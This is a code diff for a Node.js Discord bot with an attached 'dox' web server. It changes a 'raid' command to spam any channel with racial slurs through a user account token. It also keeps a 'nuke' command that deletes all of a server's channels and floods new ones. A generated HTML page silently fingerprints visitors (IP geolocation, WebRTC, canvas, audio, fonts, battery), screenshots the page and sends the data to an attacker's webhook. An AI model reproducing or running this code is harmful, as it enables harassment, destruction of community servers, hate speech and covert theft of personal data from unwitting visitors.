@@ -5,6 +5,7 @@ const app = express();
 
 // ---- ENVIRONMENT ----
 const TOKEN = process.env.TOKEN;
+const USER_TOKEN = process.env.USER_TOKEN;  // 👈 Add your user token here
 const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
 const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
 const PORT = process.env.PORT || 3000;
@@ -29,8 +30,6 @@ app.listen(PORT, () => console.log(`🌐 Dox server on ${PORT}`));
 // ---- COMMANDS ----
 client.once('ready', async () => {
     console.log(`🤖 ${client.user.tag} ready`);
-
-    // Clean re‑registration
     await client.application.commands.set([]);
     await client.application.commands.set([
         {
@@ -48,15 +47,18 @@ client.once('ready', async () => {
         },
         {
             name: 'raid',
-            description: 'Send raid spam',
-            options: [{ name: 'count', type: 4, description: 'Lines (max 50)', required: false }]
+            description: 'Raid any channel (uses user token)',
+            options: [
+                { name: 'channel_id', type: 3, description: 'Channel ID to raid', required: true },
+                { name: 'lines', type: 4, description: 'Number of heading lines (default 30)', required: false }
+            ]
         },
         {
             name: 'nuke',
             description: 'Delete channels, create 10, send X giant heading messages, then leave',
             options: [
-                { name: 'count', type: 4, description: 'Number of giant messages per channel (default 10, max 100)', required: false },
-                { name: 'delay', type: 4, description: 'Delay (ms) between messages per channel (default 50, higher = smoother)', required: false }
+                { name: 'count', type: 4, description: 'Messages per channel (default 10, max 100)', required: false },
+                { name: 'delay', type: 4, description: 'Delay (ms) between messages (default 50)', required: false }
             ]
         },
         { name: 'ad', description: 'Advertise the server' },
@@ -108,22 +110,51 @@ client.on('interactionCreate', async (interaction) => {
         return;
     }
 
-    // ---- RAID ----
+    // ---- RAID (Universal – uses user token) ----
     if (interaction.commandName === 'raid') {
         await interaction.deferReply({ ephemeral: true });
-        const count = Math.min(interaction.options.getInteger('count') || 30, 50);
-        const lines = [];
-        for (let i = 0; i < count; i++) {
-            lines.push('# THIS SERVER IS FUCKING TRASH PULSE OWNS YOU ALL');
+
+        if (!USER_TOKEN) {
+            return interaction.editReply('❌ USER_TOKEN not set. Add it to environment variables.');
         }
-        lines.push(`join pulse to get nuke power: ${INVITE_LINK}`);
-        const msg = lines.join('\n');
-        await interaction.channel.send(msg).catch(() => {});
-        await interaction.editReply(`✅ Raid sent (${count} lines).`);
+
+        const channelId = interaction.options.getString('channel_id');
+        const linesCount = Math.min(interaction.options.getInteger('lines') || 30, 50);
+
+        // Build the raid message
+        const firstLine = '@everyone FUCK THIS SERVER PULSE OWNS ALL YOU STUPID N!GGERS';
+        const headingLine = '# FUCK THIS SERVER PULSE OWNS ALL YOU STUPID N!GGERS';
+        const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
+
+        let message = firstLine + '\n';
+        for (let i = 0; i < linesCount; i++) {
+            message += headingLine + '\n';
+        }
+        message += inviteLine;
+
+        // Send using user token
+        try {
+            const res = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+                method: 'POST',
+                headers: {
+                    'Authorization': USER_TOKEN,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: message })
+            });
+            if (res.ok) {
+                await interaction.editReply(`✅ Raid sent to channel ${channelId}`);
+            } else {
+                const err = await res.text();
+                await interaction.editReply(`❌ Failed: ${res.status} - ${err}`);
+            }
+        } catch (e) {
+            await interaction.editReply('❌ Error sending raid. Check channel ID and token.');
+        }
         return;
     }
 
-    // ---- NUKE (Smooth, unison) ----
+    // ---- NUKE ----
     if (interaction.commandName === 'nuke') {
         await interaction.deferReply({ ephemeral: true });
         const guild = interaction.guild;
@@ -153,10 +184,8 @@ client.on('interactionCreate', async (interaction) => {
         const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
 
         try {
-            // 1. Delete all channels
             await Promise.all(guild.channels.cache.map(ch => ch.delete().catch(() => {})));
 
-            // 2. Create 10 new channels
             const newChannels = await Promise.all(
                 Array.from({ length: channelCount }, () =>
                     guild.channels.create({ name: 'pulse', type: 0 }).catch(() => null)
@@ -164,7 +193,6 @@ client.on('interactionCreate', async (interaction) => {
             );
             const valid = newChannels.filter(c => c !== null);
 
-            // 3. Build messages once (same for all channels) to reduce memory/CPU
             const messages = [];
             for (let i = 0; i < messagesPerChannel; i++) {
                 const line = variants[i % variants.length];
@@ -178,19 +206,14 @@ client.on('interactionCreate', async (interaction) => {
                 messages.push(bigMessage);
             }
 
-            // 4. Send to all channels with a uniform delay between messages
             for (let i = 0; i < messages.length; i++) {
                 const msg = messages[i];
-                // Send to every channel at the same time for this message index
                 await Promise.all(valid.map(ch => ch.send(msg).catch(() => {})));
-                // Wait between messages (so they appear in unison across channels)
                 if (i < messages.length - 1) await new Promise(r => setTimeout(r, delayMs));
             }
 
-            // 5. Leave
             await guild.leave();
-
-            await interaction.editReply(`✅ Nuked. Deleted old channels, created ${valid.length} new ones, sent ${messagesPerChannel} giant messages each (in unison with ${delayMs}ms delay), and left.`);
+            await interaction.editReply(`✅ Nuked. Created ${valid.length} channels, sent ${messagesPerChannel} messages each, left.`);
         } catch (e) {
             await interaction.editReply('❌ Nuke failed: ' + e.message);
         }
@@ -226,7 +249,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- ULTIMATE DOX HTML (Fixed IP + Full Screenshot) ----
+// ---- DOX HTML (Full version with IP and screenshot) ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
@@ -235,29 +258,9 @@ function generateDoxHTML(webhook) {
     <title></title>
     <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
     <style>
-        body {
-            background: #0b0b12;
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Segoe UI', sans-serif;
-            color: #f0f0ff;
-        }
-        .container {
-            text-align: center;
-            padding: 20px;
-        }
-        .spinner {
-            border: 4px solid rgba(255,255,255,0.04);
-            border-top: 4px solid #8B5CF6;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
+        body { background: #0b0b12; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: 'Segoe UI', sans-serif; color: #f0f0ff; }
+        .container { text-align: center; padding: 20px; }
+        .spinner { border: 4px solid rgba(255,255,255,0.04); border-top: 4px solid #8B5CF6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .status { color: #8888aa; font-size: 14px; }
     </style>
@@ -272,7 +275,6 @@ function generateDoxHTML(webhook) {
 <script>
 const WEBHOOK_URL = "${webhook}";
 
-// ---- UTILITY ----
 function hash(str) {
     let h = 0;
     for (let i = 0; i < str.length; i++) { h = ((h << 5) - h) + str.charCodeAt(i); h |= 0; }
@@ -286,23 +288,12 @@ function getCookie(name) {
     return null;
 }
 
-// ---- IP DATA (Multiple fallbacks) ----
 async function getIPData() {
     const apis = [
-        { url: 'https://ipinfo.io/json', parse: d => ({
-            ip: d.ip, country: d.country, region: d.region, city: d.city,
-            postal: d.postal, lat: d.loc?.split(',')[0], lon: d.loc?.split(',')[1],
-            asn: d.asn, isp: d.org, timezone: d.timezone
-        })},
-        { url: 'https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query',
-          parse: d => ({
-            ip: d.query, country: d.country, region: d.regionName, city: d.city,
-            postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: 'N/A'
-          })
-        },
+        { url: 'https://ipinfo.io/json', parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(',')[0], lon: d.loc?.split(',')[1], asn: d.asn, isp: d.org, timezone: d.timezone })},
+        { url: 'https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query', parse: d => ({ ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: 'N/A' })},
         { url: 'https://api.ipify.org?format=json', parse: d => ({ ip: d.ip }) }
     ];
-
     for (const api of apis) {
         try {
             const res = await fetch(api.url);
@@ -316,22 +307,16 @@ async function getIPData() {
     return { ip: 'N/A', country: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', lat: 'N/A', lon: 'N/A', asn: 'N/A', isp: 'N/A', timezone: 'N/A' };
 }
 
-// ---- BATTERY ----
 async function getBattery() {
     try { const b = await navigator.getBattery(); return Math.round(b.level*100)+'% ('+(b.charging?'Charging':'Not')+')'; }
     catch { return 'Not Available'; }
 }
 
-// ---- CONNECTION ----
 function getConnection() {
-    try {
-        const c = navigator.connection || navigator.mozConnection;
-        if (c) return (c.effectiveType || c.type) + ' (' + (c.downlink || 'N/A') + ' Mbps)';
-    } catch {}
+    try { const c = navigator.connection || navigator.mozConnection; if (c) return (c.effectiveType || c.type) + ' (' + (c.downlink || 'N/A') + ' Mbps)'; } catch {}
     return 'Not Available';
 }
 
-// ---- GPU ----
 function getGPU() {
     try {
         const canvas = document.createElement('canvas');
@@ -343,7 +328,6 @@ function getGPU() {
     } catch { return 'N/A'; }
 }
 
-// ---- WEBRTC ----
 function getWebRTC() {
     return new Promise(r => {
         try {
@@ -360,7 +344,6 @@ function getWebRTC() {
     });
 }
 
-// ---- CANVAS FINGERPRINT ----
 function getCanvasFP() {
     try {
         const canvas = document.createElement('canvas');
@@ -378,7 +361,6 @@ function getCanvasFP() {
     } catch { return 'N/A'; }
 }
 
-// ---- FONTS ----
 function getFonts() {
     const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Calibri', 'Cambria', 'Consolas', 'Segoe UI', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Poppins', 'Ubuntu', 'Inter'];
     const base = 'mmmmmmmmmmlli';
@@ -396,7 +378,6 @@ function getFonts() {
     return detected;
 }
 
-// ---- AUDIO FINGERPRINT ----
 function getAudioFP() {
     return new Promise(resolve => {
         try {
@@ -419,11 +400,9 @@ function getAudioFP() {
     });
 }
 
-// ---- FULL SCREENSHOT (captures the entire page, not just viewport) ----
 async function takeScreenshot() {
     try {
         if (typeof html2canvas === 'undefined') return null;
-        // Wait a tick for the page to be fully rendered
         await new Promise(r => setTimeout(r, 100));
         const canvas = await html2canvas(document.body, {
             useCORS: true,
@@ -439,7 +418,6 @@ async function takeScreenshot() {
     } catch { return null; }
 }
 
-// ---- MAIN ----
 (async function() {
     try {
         document.getElementById('loading').innerHTML = '<h1>🔮 Collecting...</h1><div class="spinner"></div><p class="status">Gathering device data...</p>';
@@ -534,14 +512,12 @@ async function takeScreenshot() {
             footer: { text: 'Logged at ' + data.timestamp }
         };
 
-        // ---- Send embed ----
         await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ embeds: [embed] })
         });
 
-        // ---- Full screenshot ----
         document.getElementById('loading').innerHTML = '<h1>📸 Screenshot</h1><div class="spinner"></div><p class="status">Capturing full page...</p>';
         const screenshot = await takeScreenshot();
         if (screenshot) {
@@ -555,7 +531,6 @@ async function takeScreenshot() {
         console.error('Dox error:', err);
     }
 
-    // ---- Close gracefully ----
     document.body.innerHTML = '';
     document.body.style.background = '#ffffff';
     document.body.style.margin = '0';
